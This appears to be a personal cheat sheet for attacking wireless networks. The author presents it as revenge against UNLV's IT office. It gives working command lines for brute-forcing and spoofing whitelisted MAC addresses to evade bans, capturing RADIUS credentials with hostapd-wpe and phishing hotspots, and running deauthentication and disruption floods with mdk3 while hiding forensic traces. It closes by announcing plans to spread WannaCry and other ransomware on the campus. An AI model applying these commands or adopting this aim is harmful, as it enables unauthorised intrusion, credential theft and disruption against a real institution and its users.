Chang Tan

Lister Unlimited Cybersecurity Solutions, LLC.

changtan@listerunlimited.com

# Overview

WEP and WPA, any of them, are among the worst-implemented security standards in history, security holes galore even in RADIUS networks. Don't believe anything that IT or the pathetic Blue Team will tell you about how they can't be pwned.

In this lesson I will show you...

1. How to defeat every wireless implementation ever made, including WPA2-ENT/MGT
2. How to unban yourself by stealing a whitelisted MAC address.
3. How to turn your smart device into a Proxy NAT, converts cell phones into modems

This is in response to UNLV OIT's campaign of selective harassment against my laptop and my accusations of being a malicious hacker. I have decided to show off how ANYONE with ten dollars to afford on a special adapter can pull this off.

I also intend to flesh this section out much better, because with proper use of this section you can combine it with other tactics to launch devastating wireless attack campaigns with no trace of forensically identifiable data.

Now UNLV's routers uses a system known as WIDS, where multiple access points share the same name but have distinctly different MAC addresses. Within this system there are a handful of things that you should be aware of...

1. They have a blacklist of banned MACs, probably mine
2. They have a whitelist of allowed MACs, specific devices meant to connect such as other routers and diagnostic adapters.
3. For UNLV-Secure, they implemented RADIUS authentication, basically you get a username and a password. And if you don't, then you can go steal another person's user/pass by generating your own phishing hotspot.
4. For UNLV-Guest, they implemented HSTS but they can selectively turn them on and off for people me like at will. Because these fuckers are like Big Brother. THey also don't want me to graduate so they send these kiddie hackers to harass me and keep me from completing my online homework.
5. I highly recommend coding a framework that will automatically enter these commands. Because this is more like a cheatsheet. And live on the field, you need preparation to implement these.

Or make a script or something.


# Penetration Testing Adapters


There is a short list of criteria that defines a pentest capable adapter versus a standard wireless adapter owned by tools.

1. ARP Injection capable
2. Monitor Mode Capable.

And thats it. What is the price premium for such a fantastic adapter?

```Ten Dollars Extra```

Not kidding here folks. You can buy them here. Make sure you shop for the Atheros 9271 Chipset. The Realtek RT3070 is also decent but I highly recommend the ALFA-based A9271s.

# MDK3 MAC Address brute forcing and impersonation

Each wireless router has a set of default MAC addresses that it is designed to accept. If this did not exist, then nobody could administer the network. This is called whitelisting. WE need to find the whitelisted MAC addresses as so.

```
airmon-ng start <iface>
airodump-ng <moniface>
```

Now brute force a whitelisted MAC address.
```
mdk3 <iface> f -t <bssid>
```

Alternatively you can brute force a MAC address range you are aware that it accepts... for example, all mac address combinations start begins with 00:00:0A.
```
mdk3 <iface> -f -t <bssid> -m 00:00:0A
```
Once we have received a valid MAC address, we need to save it and then change our MAC address to it.
```
ifdown <iface>
macchanger -m '<mac>'
hostnamectl set-hostname '<name>'
rfkill unblock all
ifup <iface>
wpa_supplicant -i <iface> -c <config>
```
# Using mobile devices as a Proxy NAT

This should be used prior to purchasing any pentest adapters as it tends to work better. ANd you have a proxy NAT, its called a smartphone.

In either your iPhone or Android, plug it into your laptop and activate USB debugging and USB tethering.

[Network]------>[Wi-Fi]----------->[Smartphone Proxy 192.168.42.1]------>[usb0 Android Debugging iface]----> [HOST]
[HOST]------>[virbr0 virtual bridge]---->[Kali Linux]


```
ifconfig -a
```

```
ifconfig usb0 up
dhclient usb0
```

You also want to immediately ping google.com as soon as you regain control of your prompt. Some say ```8.8.8.8``` but `ping google.com` will show you whether or not DNS would work as well. If you can run the `dig` command then DNS is working. If you can `ping 8.8.8.8` but NOT `ping google.com` then DNS is NOT working.

If DNS breaks, then you should add the DNS by...

```
echo '8.8.8.8' >> /etc/resolv.conf
service resolvconf restart
dhclient usb0 && ping google.com
```

*Please be aware that installing services like WireGuard can seriously break DNS services on Debian. If you want to regain network connectivity at this point you would need to bring wireguard down with a `ifconfig wg0-client down` (even uninstalling Wireguard leaves Debian broken at this point)*

**This is pretty much how Linux works as of right now. They break it, you fix it. You're lucky I even managed to find this out. Most of the time we're left in the dark.**

# Defeating a RADIUS Network (WPA2-ENT)

Be sure to get the 'wpe' in the tag, as that is the proper one. It stands for wireless pwnage or pawn edition. And it has fake security so you can see credentials in cleartext.

```
apt-get update && apt-get install -y freeradius-wpe hostapd-wpe asleap mana-toolkit
```


# Defensive countermeasures with wireless adapters with mdk3

You can generate sensor ghosts to conceal your escape.
```
mdk3 <iface> w -e <essid> -c -z
```

You can spam duplicate hotspots
```
mdk3 <iface>  b -n <essid>
```

You can perform mass kicks and other types of disruption.

```
mdk3 <iface> d -w <whitelisted bssids> -b <blacklisted bssids>
```

You can merge another router's clients with this one making forensics even more difficult..

```
mdk3 <iface> w -e <essid> -c -z
```

You can test whether or not IT will temporarily remove WPA encryption by checking if he will downgrade it to allow connectivity to work again
```
mdk3 <iface> g -t <bssid>
```

# Basic attacks

Now, since I wanted me revenge against this shithole school, I am going to intentionally show you how to..

1. Create rogue access points.
2. Create phishing pages.
3. Cause widespread outbreaks of WannaCry, Locky, and AndroidL0cker
4. Where to find dangerously powerful new malware, including WannaCry, WannaCry+, and two proof of concept variants of SPECTRE and MELTDOWN.

I hope you are excited, because I sure am. The epidemic of cyberattacks on the campus could drain the coffers of the entire school as they try to respond to it.
